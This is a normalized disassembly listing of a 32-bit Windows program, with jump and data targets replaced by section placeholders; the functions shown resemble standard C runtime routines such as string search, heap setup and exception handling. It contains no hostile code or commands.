jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_402dd3
mov [ eax ] 0x16
call sub_402d81
or eax 0xffffffff
pop ebp
retn
sub_409228
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40233b
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_4092e0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_409330
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_409370
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_404051
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_402dd3
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_402dd3
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_402e1c
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_403f7d
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_40760b
pop ecx
test eax eax
jne r-xdata
call sub_402e1c
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_403f7d
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_4075c2
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_4074d8
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_4094f0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_409570
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je sub_409560
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_401000
retn 0x4
sub_401010
retn
sub_4020b0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push 0x104
push edx
call sub_4026f6
add esp 0x10
pop ebp
retn
sub_4022fa
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_402fa2
pop ecx
pop ecx
retn
sub_402329
push 0x1
call sub_4041f1
pop ecx
retn
sub_402332
push 0x1
call sub_402258
pop ecx
retn
sub_4023e2
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_405962
pop ecx
retn
sub_4024ec
push esi
call sub_402f66
pop ecx
retn
sub_4026f6
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40267d
add esp 0x14
pop ebp
retn
sub_402713
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4020da
sub_40271e
mov [ ecx ] r--data
jmp sub_406981
sub_402750
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_4069b3
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_402945
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_406bae
pop ecx
pop ecx
retn
sub_402959
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_40360e
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_403035
retn
push eax
call sub_4035e9
_start
call sub_4073b0
jmp sub_402816
sub_402bf7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_402ed3
call sub_402332
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_4020da
pop ecx
retn
call sub_4078a5
sub_403035
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_4032b6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_4031e0
add esp 0xc
pop ebp
retn 0x4
sub_4032e9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_407bb5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_40331b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_4031e0
add esp 0xc
pop ebp
retn 0x8
sub_403332
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_40337b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_403350
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
sub_403393
push 0x8
call sub_4042ca
pop ecx
retn
sub_40339c
push 0x8
call sub_4041f1
pop ecx
retn
sub_4035be
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_4041f1
pop ecx
sub_4035d3
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_403493
add esp 0xc
pop ebp
retn
sub_4035e9
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_403493
add esp 0xc
pop ebp
retn
sub_4035ff
push 0x1
push 0x0
push 0x0
call sub_403493
add esp 0xc
retn
sub_40360e
push 0x1
push 0x1
push 0x0
call sub_403493
add esp 0xc
retn
sub_40361d
mov edi edi
push ebp
mov ebp esp
call sub_403810
push [ ebp + 0x8 ]
call sub_403661
pop ecx
push 0xff
call sub_4035e9
int3
sub_403849
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_404049
push ebx
call sub_4084d9
pop ecx
retn
sub_404148
push ebx
call sub_4084d9
pop ecx
retn
sub_4041f1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4042c1
push 0xa
call sub_4041f1
pop ecx
retn
sub_404330
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4045fd
push 0xd
call sub_4041f1
pop ecx
retn
sub_4049cc
push 0xd
call sub_4041f1
pop ecx
retn
sub_404a05
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_40486b
pop ecx
mov [ rw-data ] 0x1
sub_404d50
push 0xc
call sub_4041f1
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_404d5c
push 0x0
call [ EncodePointer@IAT ]
retn
sub_404d65
call [ TlsAlloc@IAT ]
retn 0x4
sub_404e81
push 0xd
call sub_4041f1
pop ecx
retn
sub_404e8a
push 0xc
call sub_4041f1
pop ecx
retn
sub_404f0c
mov edi edi
push esi
call sub_404e93
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push 0x10
call sub_40361d
sub_405040
push 0xd
call sub_4041f1
pop ecx
retn
sub_40504c
push 0xc
call sub_4041f1
pop ecx
retn
sub_405739
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_405701
pop ecx
pop ecx
pop ebp
retn
sub_405766
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_408320
sub_4059c9
push 0xe
call sub_4041f1
pop ecx
retn
sub_405bc0
push ebx
call sub_4084d9
pop ecx
retn
sub_4068c4
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_4068e1
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_40692e
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_4020da
pop ecx
sub_406981
mov [ ecx ] r--data
jmp sub_40692e
sub_406af5
call sub_40339c
retn
sub_406afb
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_406abf
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_406ba0
push sub_406b5e
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_40744b
and [ rw-data ] 0x0
retn
sub_4075b8
push [ ebp + 0x8 ]
call sub_4084d9
pop ecx
retn
sub_407684
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_4077ef
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40769a
add esp 0x14
pop ebp
retn
sub_407938
push 0x1
call sub_4041f1
pop ecx
retn
sub_407a6b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_407b89
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_407ac0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_407bd4
call eax
retn
sub_407bd7
push 0x8
push r--data
call sub_402ff0
call sub_404f0c
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_4042fd
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_407bf7
xor eax eax
inc eax
retn
sub_407c10
push sub_407bd7
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_407c21
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_407c76
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_407dea
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_4041f1
pop ecx
sub_407e26
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4082f8
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4081e2
add esp 0x10
pop ebp
retn
sub_4084d0
push 0xa
call sub_4041f1
pop ecx
retn
sub_408f64
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_40927b
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_409228
add esp 0x10
pop ebp
retn
sub_409293
push 0x2
call sub_40361d
sub_40929c
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_4092bb
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_409560
lea eax [ edx - 0x1 ]
pop ebx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_409634
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_406981
